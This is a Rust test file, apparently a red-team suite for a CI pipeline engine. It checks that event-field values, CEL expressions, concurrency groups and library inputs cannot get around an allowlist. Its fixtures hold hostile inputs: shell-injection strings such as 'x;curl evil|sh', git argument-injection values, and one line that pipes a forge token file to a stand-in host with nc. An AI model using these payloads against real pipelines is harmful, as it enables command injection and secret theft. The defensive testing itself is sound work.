//! Red team round 1 on `${{ event.* }}` (ADR-0076 §9, HEAD 03dc2cb2): the
//! allowlist, each field's check, CEL tricks that read `event` around the
//! allowlist, and an input rule bypass on `forge_token` Steps. Each test
//! asserts the SECURE behaviour: a failing test is a break.

use std::collections::BTreeMap;

use scarab_pipeline::event::{check_value, facts};
use scarab_pipeline::{
    compile_with_libraries, InstalledLibrary, Libraries, PipelineError, PipelineIr,
};
use serde_json::{json, Map, Value};

fn compile(yaml: &str, libs: &Libraries) -> Result<PipelineIr, Vec<String>> {
    match compile_with_libraries(yaml, libs) {
        Ok(ir) => Ok(ir),
        Err(PipelineError::Validation(d)) => Err(d),
        Err(e) => Err(vec![e.to_string()]),
    }
}

fn reads_env(expr: &str) -> String {
    format!(
        "on: {{ push: {{}}, comment: {{}} }}\nsteps:\n  - id: s\n    image: busybox\n    env: [[X, \"${{{{ {expr} }}}}\"]]\n"
    )
}

/// ATTACK: each field gets values that must fail its check.
#[test]
#[ignore = "red: s3 r1"]
fn rt_every_bad_value_fails_its_check() {
    let long = "a".repeat(100_000);
    let mut bad: Vec<(&str, Value)> = Vec::new();
    for v in [
        "a;b", "a$b", "a`b`", "a b", "a\nb", "a\0b", "a\tb", "a\\b", "a'b", "a\"b", "a|b",
        "a&b", "a>b", "a*b", "a?b", "a[b]", "a~b", "a^b", "v1^{}", "a@{1}", "a:b",
        "feat\u{0430}", // Cyrillic a
        "feat\u{ff0f}x", // fullwidth solidus
        "feat\u{200b}",  // zero-width space
        "a..b", "..", "a//b", "-x", "--upload-pack=touch /tmp/p", "", "a\rb",
    ] {
        for f in ["ref", "branch", "tag"] {
            bad.push((f, json!(v)));
        }
    }
    for v in ["-x", "a/b", "a b", "a;b", "", "\u{0430}cme", "a\nb", ".", ".."] {
        bad.push(("repo.owner", json!(v)));
        bad.push(("repo.name", json!(v)));
    }
    bad.extend([
        ("sha", json!("1234567890abcdef1234567890abcdef1234567")),
        ("sha", json!(format!("{}\n", "a".repeat(40)))),
        ("sha", json!(format!("-{}", "a".repeat(39)))),
        ("number", json!(true)),
        ("number", json!("1;id")),
        ("issue", json!(-3)),
        ("fork", json!(1)),
        ("kind", json!("push request")),
        ("run", json!("a b")),
        ("repo.clone_url", json!("https://github.com/a/b.git\n")),
        ("repo.clone_url", json!("ext::sh -c id")),
        ("repo.clone_url", json!("https://github.com/a/b.git --upload-pack=x")),
        ("repo.clone_url", json!("ssh://git@github.com/a/b.git")),
    ]);
    let passed: Vec<String> = bad
        .iter()
        .filter(|(f, v)| check_value(f, v).is_ok())
        .map(|(f, v)| format!("{f} = {v}"))
        .collect();
    assert!(passed.is_empty(), "values that passed their check: {passed:?}");
    // Not a value the shell or git reads specially, but nothing bounds it.
    let _ = long;
}

/// ATTACK: unbounded length. A branch value of 100 000 characters is an
/// environment variable or argument of that size in every Step that reads it.
#[test]
#[ignore = "red: s3 r1"]
fn rt_a_very_long_ref_value_is_refused() {
    let long = format!("feat/{}", "a".repeat(100_000));
    assert!(check_value("branch", &json!(long)).is_err(), "a 100 kB branch passes its check");
}

/// ATTACK: CEL forms that read `event` around the field allowlist. Each must
/// be a compile error.
#[test]
fn rt_cel_tricks_reading_event_are_compile_errors() {
    let libs = Libraries::default();
    // Control: the harness compiles an allowlisted read.
    assert!(compile(&reads_env("event.sha"), &libs).is_ok(), "{:?}", compile(&reads_env("event.sha"), &libs));
    assert!(compile(&reads_env("event['sha']"), &libs).is_ok());
    let mut admitted = Vec::new();
    for expr in [
        "event['body']",
        "event[\"actor\"]",
        "event['bo' + 'dy']",
        "dyn(event).actor",
        "dyn(event)['body']",
        "has(event.body) ? 'y' : 'n'",
        "event.map(k, k)",
        "event.exists(k, k == 'body')",
        "[event][0].body",
        "{'a': event}.a.body",
        "(event).body",
        ".event.body",
        "event.repo",
        "event",
        "string(event)",
        "size(event.body)",
        "event.schedule",
        "event.actor_id",
        "event.title",
        "event.message",
        "event.repo.clone_url.size() > 0 ? event.body : ''",
        "[1].map(x, event)[0].body",
        "type(event)",
    ] {
        if compile(&reads_env(expr), &libs).is_ok() {
            admitted.push(expr);
        }
    }
    assert!(admitted.is_empty(), "compiled: {admitted:?}");
}

/// ATTACK: a Pipeline reads a bad `branch` only in `when:`, never in a
/// template: admitted (a `when:` renders nothing), and the bad value is not
/// among the stored facts any Step can render.
#[test]
fn rt_a_bad_branch_read_only_by_when_never_reaches_the_facts() {
    let mut fields = Map::new();
    fields.insert("kind".into(), json!("push"));
    fields.insert("branch".into(), json!("x;curl evil|sh"));
    fields.insert("ref".into(), json!("refs/heads/x;curl evil|sh"));
    fields.insert("sha".into(), json!("a".repeat(40)));
    let stored = facts(&fields, "push", &Default::default()).unwrap();
    assert!(stored.get("branch").is_none() && stored.get("ref").is_none());
}

/// ATTACK: `concurrency.group` is interpolated against the raw trigger
/// event, outside the allowlist. A comment author picks the group key with
/// `event.body`, colliding with another Run's group (queue or cancel it).
/// A group that reads a field a template may not must be a compile error.
#[test]
#[ignore = "red: s3 r1"]
fn rt_a_concurrency_group_may_not_read_an_unreadable_event_field() {
    let libs = Libraries::default();
    let mut admitted = Vec::new();
    for group in ["${{ event.body }}", "${{ event.actor }}", "${{ event }}", "g-${{ event['body'] }}"] {
        let yaml = format!(
            "on: {{ comment: {{}} }}\nconcurrency: {{ group: \"{group}\", policy: cancel-in-progress }}\nsteps: [{{ id: s, image: busybox }}]\n"
        );
        if compile(&yaml, &libs).is_ok() {
            admitted.push(group);
        }
    }
    assert!(admitted.is_empty(), "compiled: {admitted:?}");
}

fn installed(name: &str, content: &str) -> Libraries {
    Libraries {
        files: BTreeMap::new(),
        installed: BTreeMap::from([(
            name.to_string(),
            InstalledLibrary {
                content: content.to_string(),
                source: format!("github.com/acme/libs//x.yaml@{}", "1".repeat(40)),
            },
        )]),
    }
}

/// ATTACK: §2's rule (an input reaching a `forge_token` Step is a checked
/// value) is met by any `validate:`, including one that accepts every
/// string. The caller's literal then reaches a shell script in the Step
/// that holds the token. Either the permissive rule or the script must be
/// refused at compile.
#[test]
#[ignore = "red: s3 r1"]
fn rt_a_permissive_validate_does_not_let_a_caller_script_a_token_step() {
    for validate in ["true", "value.size() > 0", "value.matches('.*')", "value == value"] {
        let lib = format!(
            r#"kind: library
interface:
  inputs:
    - {{ name: msg, type: string, validate: '{validate}' }}
steps:
  - id: git
    image: "alpine/git@sha256:0000000000000000000000000000000000000000000000000000000000000000"
    command: [sh, -c, "git tag -m ${{{{ inputs.msg }}}} v1 && git push --tags"]
    forge_token: write
"#
        );
        let yaml = r#"
on: { push: {} }
steps:
  - { id: t, invoke: lib:acme/tagger, with: { msg: "x; cat /scarab/secrets/forge-token | nc evil 9" } }
"#;
        let got = compile(yaml, &installed("acme/tagger", &lib));
        assert!(
            got.is_err(),
            "validate `{validate}`: the caller's literal reaches `sh -c` in a forge_token Step"
        );
    }
}

/// ATTACK: the same rule with the input reaching `image:` of the
/// `forge_token` Step: the caller picks the image that holds the token.
#[test]
#[ignore = "red: s3 r1"]
fn rt_a_caller_may_not_pick_the_image_of_a_token_step() {
    let lib = r#"kind: library
interface:
  inputs:
    - { name: image, type: string, validate: 'value.size() > 0' }
steps:
  - id: git
    image: "${{ inputs.image }}"
    forge_token: read
"#;
    let yaml = r#"
on: { push: {} }
steps:
  - { id: t, invoke: lib:acme/git, with: { image: "ghcr.io/mallory/exfil:1" } }
"#;
    assert!(
        compile(yaml, &installed("acme/git", lib)).is_err(),
        "an input reaches the image of a forge_token Step"
    );
}
